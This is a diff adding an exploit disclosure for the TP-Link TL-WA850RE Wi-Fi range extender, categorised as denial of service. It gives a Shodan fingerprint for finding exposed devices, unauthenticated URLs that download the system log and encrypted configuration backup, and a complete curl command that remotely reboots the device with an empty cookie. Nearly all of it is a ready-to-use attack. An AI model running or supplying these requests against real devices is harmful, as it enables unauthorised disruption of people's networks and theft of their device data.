@@ -1,0 +1,22 @@
+# Exploit Title: TP-Link Technologies TL-WA850RE Wi-Fi Range Extender | Unauthorized Remote Reboot
+# Date: 25/04/2018
+# Exploit Author: Wadeek
+# Vendor Homepage: https://www.tp-link.com/
+# Firmware Link: https://www.tp-link.com/en/download/TL-WA850RE.html
+# Category: dos
+
+1. www.shodan.io (with title "Opening...")
+
+"HTTP/1.1 200 OK" "Server: TP-LINK HTTPD/1.0" "COOKIE="
+
+2. Proof of Concept
+
+
+:System Log:
+/data/systemlog.txt?operation=save
+
+:Encrypted Configuration File:
+/data/config.bin?operation=backup
+
+:Reboot:
+curl --silent 'http://[IP]/data/reboot.json' -H 'Host: [IP]' -H 'Accept: application/json, text/javascript, */*;' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: COOKIE=' -H 'Connection: keep-alive' --data 'operation=write'
